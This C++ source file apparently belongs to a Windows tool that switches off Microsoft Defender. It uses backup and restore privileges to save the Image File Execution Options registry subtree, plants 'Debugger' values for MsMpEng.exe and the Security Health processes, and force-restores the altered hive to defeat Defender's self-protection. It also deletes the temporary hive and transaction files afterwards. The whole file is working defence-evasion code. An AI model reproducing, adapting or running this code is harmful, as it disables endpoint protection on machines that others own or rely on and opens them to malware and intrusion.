// DefenderManager.cpp
// Windows Defender engine control via IFEO offline hive manipulation.

#include "DefenderManager.h"
#include "common.h"

#include <tlhelp32.h>

namespace fs = std::filesystem;

// ============================================================================
// PUBLIC INTERFACE
// ============================================================================

bool DefenderManager::DisableSecurityEngine() noexcept
{
    std::wcout << L"[*] Adding IFEO block for MsMpEng.exe...\n";

    if (!EnableRequiredPrivileges()) {
        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
        return false;
    }

    HiveContext ctx;
    if (!CreateIFEOSnapshot(ctx)) {
        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
        return false;
    }
    if (!ModifyMsMpEngIFEO(ctx, true)) {
        std::wcout << L"[!] Failed to set Debugger value in temp hive\n";
        return false;
    }
    if (!RestoreIFEOSnapshot(ctx)) {
        std::wcout << L"[!] Failed to restore IFEO hive\n";
        return false;
    }

    std::wcout << L"[+] IFEO block set (WinDefend's self-preservation capabilities are disabled.)\n";
    return true;
}

bool DefenderManager::EnableSecurityEngine() noexcept
{
    std::wcout << L"[*] Removing IFEO block for MsMpEng.exe...\n";

    if (!EnableRequiredPrivileges()) {
        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
        return false;
    }

    HiveContext ctx;
    if (!CreateIFEOSnapshot(ctx)) {
        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
        return false;
    }
    if (!ModifyMsMpEngIFEO(ctx, false)) {
        std::wcout << L"[!] Failed to remove Debugger value from temp hive\n";
        return false;
    }
    if (!RestoreIFEOSnapshot(ctx)) {
        std::wcout << L"[!] Failed to restore IFEO hive\n";
        return false;
    }

    std::wcout << L"[+] IFEO block removed\n";

    std::wcout << L"[*] Starting WinDefend service...\n";
    if (StartWinDefend()) {
        std::wcout << L"[+] WinDefend started — MsMpEng.exe will launch shortly\n";
    } else {
        std::wcout << L"[-] WinDefend could not be started (service may be absent or disabled)\n";
    }

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService", SERVICE_START);
        if (hHealth) {
            if (StartServiceW(hHealth, 0, nullptr) ||
                GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                std::wcout << L"[+] SecurityHealthService started\n";
            else
                std::wcout << L"[-] SecurityHealthService could not be started\n";
            CloseServiceHandle(hHealth);
        }
        CloseServiceHandle(hSCM);
    }

    {
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        if (CreateProcessW(L"C:\\Windows\\System32\\SecurityHealthSystray.exe",
                           nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
            std::wcout << L"[+] SecurityHealthSystray.exe launched\n";
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        } else {
            std::wcout << L"[-] SecurityHealthSystray.exe could not be launched (err=" << GetLastError() << L")\n";
        }
    }

    return true;
}

// ============================================================================
// STATUS
// ============================================================================

DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
{
    DefenderStatus s{};
    s.state           = SecurityState::UNKNOWN;
    s.ifeoBlocked     = false;
    s.winDefendRunning = false;
    s.msmpengRunning  = false;

    // --- IFEO check (read-only, no elevation needed) ---
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MSMPENG_SUBKEY,
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buf[MAX_PATH] = {};
        DWORD sz   = sizeof(buf);
        DWORD type = 0;
        if (RegQueryValueExW(hKey, DEBUGGER_VALUE, nullptr, &type,
                             reinterpret_cast<LPBYTE>(buf), &sz) == ERROR_SUCCESS
            && type == REG_SZ) {
            s.ifeoBlocked   = true;
            s.ifeoDebugger  = buf;
        }
        RegCloseKey(hKey);
    }

    // --- WinDefend service state ---
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS ss{};
            if (QueryServiceStatus(hSvc, &ss)) {
                s.winDefendRunning = (ss.dwCurrentState == SERVICE_RUNNING);
                if (ss.dwCurrentState == SERVICE_RUNNING && !s.ifeoBlocked)
                    s.state = SecurityState::ACTIVE;
                else if (s.ifeoBlocked)
                    s.state = SecurityState::IFEO_BLOCKED;
                else
                    s.state = SecurityState::INACTIVE;
            }
            CloseServiceHandle(hSvc);
        } else {
            // Service handle not found — Defender may not be installed.
            s.state = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
                      ? SecurityState::NOT_INSTALLED
                      : SecurityState::UNKNOWN;
        }
        CloseServiceHandle(hSCM);
    }

    // --- MsMpEng.exe process ---
    s.msmpengRunning = IsMsMpEngRunning();

    // Refine state: if IFEO block is set but engine is currently alive, still
    // report IFEO_BLOCKED — it will stay dead after the next restart.
    if (s.ifeoBlocked)
        s.state = SecurityState::IFEO_BLOCKED;

    return s;
}

DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept
{
    return QueryStatus().state;
}

// ============================================================================
// PRIVATE — HIVE OPERATIONS
// ============================================================================

bool DefenderManager::EnableRequiredPrivileges() noexcept
{
    return PrivilegeUtils::EnablePrivilege(SE_BACKUP_NAME) &&
           PrivilegeUtils::EnablePrivilege(SE_RESTORE_NAME);
}

bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
{
    ctx.tempPath = ::GetSystemTempPath();
    if (ctx.tempPath.empty()) {
        std::wcout << L"[!] Cannot resolve system temp path\n";
        return false;
    }

    ctx.hiveFile = ctx.tempPath + L"\\Ifeo.hiv";

    // Remove stale hive file.
    if (fs::exists(ctx.hiveFile))
        DeleteFileW(ctx.hiveFile.c_str());

    // Unload any leftover TempIFEO mount.
    HKEY hCheck = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
                      0, KEY_READ, &hCheck) == ERROR_SUCCESS) {
        RegCloseKey(hCheck);
        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);
    }

    // Save the live IFEO subtree to disk.
    HKEY hIfeo = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                      0, KEY_READ, &hIfeo) != ERROR_SUCCESS) {
        std::wcout << L"[!] Cannot open IFEO registry key\n";
        return false;
    }

    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
    RegCloseKey(hIfeo);
    if (r != ERROR_SUCCESS) {
        std::wcout << L"[!] RegSaveKeyEx failed: " << r << L"\n";
        return false;
    }

    // Mount the saved hive as HKLM\TempIFEO.
    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
                    ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
        std::wcout << L"[!] RegLoadKey failed\n";
        return false;
    }

    return true;
}

bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBlock) noexcept
{
    // MsMpEng.exe is required; SecurityHealthSystray.exe and SecurityHealthService.exe
    // are companion blocks — their failure is non-fatal.
    static constexpr const wchar_t* targets[] = {
        L"MsMpEng.exe",
        L"SecurityHealthSystray.exe",
        L"SecurityHealthService.exe"
    };

    for (size_t i = 0; i < 3; ++i) {
        const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\" + targets[i];
        const bool required = (i == 0);

        if (addBlock) {
            HKEY hKey = nullptr;
            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                                     0, nullptr, REG_OPTION_NON_VOLATILE,
                                     KEY_WRITE, nullptr, &hKey, nullptr);
            if (r != ERROR_SUCCESS) {
                if (required) {
                    std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\" << targets[i]
                               << L" failed: " << r << L"\n";
                    return false;
                }
                continue;
            }
            const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
            r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
                               reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
            RegCloseKey(hKey);
            if (r != ERROR_SUCCESS && required) {
                std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
                return false;
            }
        } else {
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                              0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                RegDeleteValueW(hKey, DEBUGGER_VALUE);
                RegCloseKey(hKey);
            }
            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
        }
    }

    return true;
}

bool DefenderManager::RestoreIFEOSnapshot(const HiveContext& ctx) noexcept
{
    // Flush and unmount the temp hive.
    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME) != ERROR_SUCCESS)
        std::wcout << L"[!] Warning: RegUnLoadKey(TempIFEO) failed\n";

    // Force-restore the modified hive over the live IFEO subtree.
    HKEY hIfeo = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                      0, KEY_WRITE, &hIfeo) != ERROR_SUCCESS) {
        std::wcout << L"[!] Cannot open IFEO key for restore\n";
        return false;
    }

    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
    RegCloseKey(hIfeo);
    if (r != ERROR_SUCCESS) {
        std::wcout << L"[!] RegRestoreKey failed: " << r << L"\n";
        return false;
    }

    return true;
}

// ============================================================================
// PRIVATE — SERVICE & PROCESS HELPERS
// ============================================================================

bool DefenderManager::StartWinDefend() noexcept
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC,
                                  SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return false;
    }

    bool ok = StartServiceW(hSvc, 0, nullptr)
           || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ok;
}

bool DefenderManager::IsMsMpEngRunning() noexcept
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe{ sizeof(pe) };
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"MsMpEng.exe") == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

bool DefenderManager::IsWinDefendRunning() noexcept
{
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
    if (!hSvc) { CloseServiceHandle(hSCM); return false; }

    SERVICE_STATUS ss{};
    bool running = QueryServiceStatus(hSvc, &ss)
                && ss.dwCurrentState == SERVICE_RUNNING;

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return running;
}

// ============================================================================
// HIVE CONTEXT CLEANUP
// ============================================================================

void DefenderManager::HiveContext::Cleanup() noexcept
{
    if (hiveFile.empty()) return;

    for (const auto& path : {
            hiveFile,
            hiveFile + L".LOG1",
            hiveFile + L".LOG2",
            hiveFile + L".blf" }) {
        DeleteFileW(path.c_str());
    }

    // Remove CLFS transaction files created by RegLoadKey/RegUnLoadKey.
    // They live in the same directory as the hive file and are named
    // <hivefilename>{GUID}.TM.blf and <hivefilename>{GUID}.TMContainer*.regtrans-ms.
    try {
        const fs::path hiveDir  = fs::path(hiveFile).parent_path();
        const std::wstring base = fs::path(hiveFile).filename().wstring();
        for (const auto& entry : fs::directory_iterator(hiveDir)) {
            const std::wstring fname = entry.path().filename().wstring();
            if (fname.size() > base.size() &&
                _wcsnicmp(fname.c_str(), base.c_str(), base.size()) == 0 &&
                fname[base.size()] == L'{') {
                DeleteFileW(entry.path().c_str());
            }
        }
    } catch (...) {}
}
